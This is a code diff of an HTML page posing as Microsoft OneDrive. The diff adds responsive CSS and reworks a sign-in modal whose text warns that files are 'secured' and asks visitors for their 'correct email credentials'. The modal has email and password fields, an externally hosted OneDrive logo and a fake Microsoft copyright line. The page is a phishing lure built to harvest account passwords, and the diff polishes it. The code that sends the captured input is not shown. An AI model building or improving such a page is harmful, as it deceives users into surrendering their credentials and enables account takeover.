@@ -6,23 +6,96 @@
   <title>OneDrive</title>
   <link rel="stylesheet" href="styles.css" />
   <script defer src="script.js"></script>
+  <style>
+    @media (max-width: 768px) {
+      .top-bar {
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+
+      .search, .filter {
+        width: 100%;
+        margin-top: 8px;
+      }
+
+      .right-icons {
+        margin-left: auto;
+      }
+
+      .container {
+        flex-direction: column;
+        padding: 10px;
+      }
+
+      .sidebar {
+        width: 100%;
+        border-right: none;
+        border-bottom: 1px solid #ccc;
+      }
+
+      .main-panel {
+        padding: 10px;
+      }
+
+      .file-grid {
+        justify-content: center;
+      }
+
+      .file {
+        width: 45%;
+      }
+
+      .modal-content {
+        width: 90%;
+      }
+
+      .sign-in-modal {
+        padding: 20px;
+      }
+
+      .top-actions {
+        justify-content: center;
+        flex-wrap: wrap;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .file {
+        width: 100%;
+      }
+
+      .top-bar .logo {
+        font-size: 16px;
+      }
+
+      .toolbar {
+        flex-direction: column;
+        gap: 8px;
+      }
+
+      .toolbar-btn {
+        width: 100%;
+      }
+    }
+  </style>
 </head>
-<div id="modal-overlay" class="modal-overlay hidden"></div>
-<div id="sign-in-modal" class="sign-in-modal hidden">
-  <div class="modal-content">
-    <img src="https://i.ibb.co/8g09gkSc/onedrive-logo.png" alt="OneDrive" class="onedrive-logo" />
-    <p class="modal-note">
-      These files are sensitive and secured against unauthorized access. In order to access the files, please provide your correct email credentials.
-    </p>
-    <h3>Please Confirm Receiving E-mail to View Files</h3>
-    <input type="email" class="sign-in-input email-field" placeholder="Email" />
-    <input type="password" class="sign-in-input" placeholder="Password" />
-    <button id="sign-in-btn" class="sign-in-btn">Verifying ...</button>
-    <p class="modal-footer">© Microsoft Corporation. All rights reserved. 2025</p>
-    <button id="close-btn" class="close-btn">×</button>
-  </div>
-</div>
 <body>
+  <div id="modal-overlay" class="modal-overlay hidden"></div>
+  <div id="sign-in-modal" class="sign-in-modal hidden">
+    <div class="modal-content">
+      <img src="https://i.ibb.co/8g09gkSc/onedrive-logo.png" alt="OneDrive" class="onedrive-logo" />
+      <p class="modal-note">
+        These files are sensitive and secured against unauthorized access. In order to access the files, please provide your correct email credentials.
+      </p>
+      <h3>Please Confirm Receiving E-mail to View Files</h3>
+      <input type="email" class="sign-in-input email-field" placeholder="Email" />
+      <input type="password" class="sign-in-input" placeholder="Password" />
+      <button id="sign-in-btn" class="sign-in-btn">Verifying ...</button>
+      <p class="modal-footer">© Microsoft Corporation. All rights reserved. 2025</p>
+      <button id="close-btn" class="close-btn">×</button>
+    </div>
+  </div>
+
   <header class="top-bar">
     <div class="left">
       <button class="menu">☰</button>
@@ -39,7 +112,7 @@
     </div>
   </header>
 
-  <div class="container">
+  <div class="container" style="display: flex;">
     <aside class="sidebar">
       <h3>Files Directory</h3>
       <ul>
@@ -91,18 +164,6 @@
         </div>
       </div>
     </main>
-  </div>
-
-  <!-- Modal + Overlay (Login) -->
-  <div id="modal-overlay" class="modal-overlay hidden"></div>
-  <div id="sign-in-modal" class="sign-in-modal hidden">
-    <div class="modal-content">
-      <h2>Sign in to OneDrive</h2>
-      <input type="email" class="sign-in-input" placeholder="Email" />
-      <input type="password" class="sign-in-input" placeholder="Password" />
-      <button id="sign-in-btn" class="sign-in-btn">Sign In</button>
-      <button id="close-btn" class="close-btn">Close</button>
-    </div>
   </div>
 </body>
 </html>
